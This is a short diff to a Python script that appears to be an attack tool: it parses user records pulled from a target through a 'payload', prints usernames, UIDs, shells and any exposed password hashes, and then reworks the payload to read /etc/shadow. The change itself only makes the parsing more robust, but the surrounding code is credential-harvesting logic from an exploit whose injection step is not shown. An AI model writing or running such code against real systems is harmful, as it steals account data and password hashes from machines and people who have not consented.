@@ -1957,14 +1957,25 @@ if __name__ == "__main__":
                         
                         print(f"\n{C.G}👥 SYSTEM USERS FOUND:{C.E}")
                         for user_data in users:
-                            username, password, uid, gid, info, home, shell = user_data
-                            if int(uid) >= 0 and int(uid) <= 1000:  # System and user accounts
-                                print(f"\n{C.W}Username: {username}{C.E}")
-                                print(f"  UID: {uid} | GID: {gid}")
-                                print(f"  Home: {home}")
-                                print(f"  Shell: {shell}")
-                                if password and password not in ['x', '*', '!']:
-                                    print(f"  {C.F}Password Hash: {password}{C.E}")
+                            if len(user_data) >= 7:
+                                username = user_data[0]
+                                password = user_data[1]
+                                uid = user_data[2]
+                                gid = user_data[3]
+                                info = user_data[4]
+                                home = user_data[5]
+                                shell = user_data[6]
+                                
+                                try:
+                                    if int(uid) >= 0 and int(uid) <= 1000:
+                                        print(f"\n{C.W}Username: {username}{C.E}")
+                                        print(f"  UID: {uid} | GID: {gid}")
+                                        print(f"  Home: {home}")
+                                        print(f"  Shell: {shell}")
+                                        if password and password not in ['x', '*', '!']:
+                                            print(f"  {C.F}Password Hash: {password}{C.E}")
+                                except:
+                                    pass
                         
                         # Try to read /etc/shadow if possible
                         shadow_payload = payload.replace('passwd', 'shadow')
